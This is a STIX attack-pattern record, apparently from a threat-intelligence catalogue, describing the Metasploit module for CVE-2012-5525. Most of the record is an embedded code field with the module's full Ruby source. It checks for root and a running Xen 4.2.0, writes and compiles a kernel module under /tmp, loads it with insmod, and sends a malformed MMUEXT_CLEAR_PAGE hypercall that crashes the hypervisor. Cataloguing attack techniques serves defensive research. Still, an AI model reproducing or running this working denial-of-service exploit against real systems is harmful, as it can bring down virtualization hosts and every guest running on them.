{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ec8124d9-bc7a-4a9a-b9fa-8052cf16cd42",
    "created": "2024-08-14T16:33:13.582393Z",
    "modified": "2024-08-14T16:33:13.582397Z",
    "name": "Linux DoS Xen 4.2.0 2012-5525",
    "description": " This module causes a hypervisor crash in Xen 4.2.0 when invoked from a paravirtualized VM, including from dom0.  Successfully tested on Debian 7 3.2.0-4-amd64 with Xen 4.2.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/dos/xen_420_dos.rb",
            "external_id": "xen_420_dos.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux DoS Xen 4.2.0 2012-5525',\n        'Description' => %q{\n          This module causes a hypervisor crash in Xen 4.2.0 when invoked from a\n          paravirtualized VM, including from dom0.  Successfully tested on Debian 7\n          3.2.0-4-amd64 with Xen 4.2.0.\n        },\n        'References' => [ ['CVE', '2012-5525'] ],\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Christoph Sendner <christoph.sendner[at]stud-mail.uni-wuerzburg.de>',\n          'Aleksandar Milenkoski  <aleksandar.milenkoski[at]uni-wuerzburg.de>'\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ARCH_X64],\n        'SessionTypes' => ['shell']\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('WritableDir', [true, 'A directory for storing temporary files on the target system', '/tmp'])\n      ], self.class\n    )\n  end\n\n  def run\n    # Variables\n    @rand_folder = '/' + Rex::Text.rand_text_alpha(rand(7..11)).to_s\n    @writeable_folder = datastore['WritableDir'].to_s + @rand_folder\n\n    # Testing requirements\n    print_status('Detecting requirements...')\n    return unless requirements_met?\n\n    # Cearting and writing random paths and files\n    vprint_status('Creating random file and folder names')\n    write_files\n\n    # Execute make and insmod\n    do_insmod\n\n    # Testing success of DoS\n    test_success\n  end\n\n  ##\n  # Test all requirements:\n  #  - root-priviliges\n  #  - build-essentials\n  #  - xen-enviroment (existing, not running)\n  #  - xen-running\n  #  - xen-version (DoS only works on specific versions)\n  ##\n\n  def requirements_met?\n    unless is_root?\n      print_error('Root access is required')\n      return false\n    end\n    print_good('Detected root privilege')\n\n    unless build_essential?\n      print_error('No build-essential package found')\n      return false\n    end\n    print_good('Detected build-essential')\n\n    unless xen?\n      print_error('Running Xen was not found')\n      return false\n    end\n    print_good('Detected Xen')\n\n    unless xen_running?\n      print_error('Xen is not running')\n      return false\n    end\n    print_good('Detected running Xen')\n\n    unless right_xen_version?\n      print_error('Incorrect Xen version running')\n      return false\n    end\n    print_good('Detected correct Xen version')\n\n    true\n  end\n\n  ##\n  # Checks for build essentials\n  #  - Required for building a lkm\n  #  - checks for gcc/g++, make and linux-headers\n  #  - commands sh-conform\n  ##\n\n  def build_essential?\n    check_command = 'if [ -s $( which gcc ) ] && '\n    check_command << '[ -s $( which g++ ) ] && '\n    check_command << '[ -s $( which make ) ] && '\n    check_command << '[ \"$( dpkg -l | grep linux-headers-$(uname -r) )\" != \"\" ] ;'\n    check_command << 'then echo OK;'\n    check_command << 'fi'\n\n    cmd_exec(check_command).delete(\"\\r\") == 'OK'\n  end\n\n  ##\n  # Checks for running Xen Hypervisor\n  #  - Looks for Xen in lsmod, lscpu, dmesg and /sys/bus\n  #  - commands sh-conform\n  ##\n\n  def xen?\n    check_command = 'if [ \"$( lsmod | grep xen )\" != \"\" ] || '\n    check_command << '[ \"$( lscpu | grep Xen )\" != \"\" ] || '\n    check_command << '[ \"$( dmesg | grep xen )\" != \"\" ] || '\n    check_command << '[ \"$( which xl )\" != \"\" ] ;'\n    check_command << 'then echo OK;'\n    check_command << 'fi'\n\n    cmd_exec(check_command).delete(\"\\r\") == 'OK'\n  end\n\n  ##\n  # Checks for running Xen\n  #  - Host eventually has Xen installed, but not running\n  #  - DoS needs a running Xen on Host\n  ##\n\n  def xen_running?\n    check_command = 'if [ -f /var/run/xenstored.pid -o -f /var/run/xenstore.pid ] ; then echo OK; fi'\n\n    cmd_exec(check_command).delete(\"\\r\") == 'OK'\n  end\n\n  ##\n  # Checks for Xen Version\n  #  - Most DoS of Xen require a specific version - here: 4.2.0\n  #  - commands need running Xen - so execute after test for xen\n  ##\n\n  def right_xen_version?\n    cmd_major = \"xl info | grep xen_major | grep -o '[0-9]*'\"\n    xen_major = cmd_exec(cmd_major).delete(\"\\r\")\n    cmd_minor = \"xl info | grep xen_minor | grep -o '[0-9]*'\"\n    xen_minor = cmd_exec(cmd_minor).delete(\"\\r\")\n    cmd_extra = \"xl info | grep xen_extra | grep -o '[0-9]*'\"\n    xen_extra = cmd_exec(cmd_extra).delete(\"\\r\")\n\n    xen_version = xen_major + '.' + xen_minor + '.' + xen_extra\n\n    print_status('Xen Version: ' + xen_version)\n\n    xen_version == '4.2.0'\n  end\n\n  ##\n  # Creating and writing files:\n  #  - c_file for c-code\n  #  - Makefile\n  ##\n\n  def write_files\n    @c_name = Rex::Text.rand_text_alpha(rand(7..11)).to_s\n    @c_file = \"#{@writeable_folder}/#{@c_name}.c\"\n    @make_file = \"#{@writeable_folder}/Makefile\"\n\n    vprint_status(\"Creating folder '#{@writeable_folder}'\")\n    cmd_exec(\"mkdir #{@writeable_folder}\")\n\n    vprint_status(\"Writing C code to '#{@c_file}'\")\n    write_file(@c_file, c_code)\n    vprint_status(\"Writing Makefile to '#{@make_file}'\")\n    write_file(@make_file, make_code)\n  end\n\n  ##\n  # Compiling and execute LKM\n  ##\n\n  def do_insmod\n    cmd_exec(\"cd #{@writeable_folder}\")\n    vprint_status('Making module...')\n    cmd_exec('make')\n    vprint_status(\"Insmod '#{@writeable_folder}/#{@c_name}.ko'\")\n    cmd_exec(\"insmod #{@writeable_folder}/#{@c_name}.ko\")\n  end\n\n  ##\n  # Test for success via ssh-error exception\n  #  - Host down => ssh-error => DoS successful\n  ##\n\n  def test_success\n    successful = false\n    begin\n      is_root?\n    rescue RuntimeError => e\n      successful = true if e.message == 'Could not determine UID: \"\"'\n      raise unless successful\n    ensure\n      if successful\n        print_good('DoS was successful!')\n      else\n        print_error('DoS has failed')\n      end\n    end\n  end\n\n  ##\n  # Returns Makefile to compile\n  #  - LKMs need a Makefile\n  #  - Needs the linux-headers, make and gcc\n  ##\n\n  def make_code\n    m = <<~END\n      obj-m := #{@c_name}.o\n\n      EXTRA_CFLAGS+= -save-temps\n\n      all:\n      \\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\n      clean:\n      \\t$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n    END\n    m\n  end\n\n  ##\n  # Returns the c-Code to compile\n  #  - Contains the essential bug to crash Xen\n  #  - Here: Force a segmentation fault via hypercall, which crashes the host\n  ##\n\n  def c_code\n    c = <<~END\n      #undef __KERNEL__\n      #define __KERNEL__\n      #undef MODULE\n      #define MODULE\n      #include <linux/module.h>\n      #include <asm/xen/hypercall.h>\n      MODULE_LICENSE(\"GPL\");\n      static int __init lkm_init(void)\n      {\n      struct mmuext_op op;\n      int status;\n      op.cmd = 16; /*MMUEXT_CLEAR_PAGE*/\n      op.arg1.mfn = 0x0EEEEE; /*A large enough MFN*/\n      HYPERVISOR_mmuext_op(&op, 1, &status, DOMID_SELF);\n      return 0;\n      }\n      static void __exit lkm_cleanup(void)\n      {\n      }\n      module_init(lkm_init);\n      module_exit(lkm_cleanup);\n    END\n    c\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}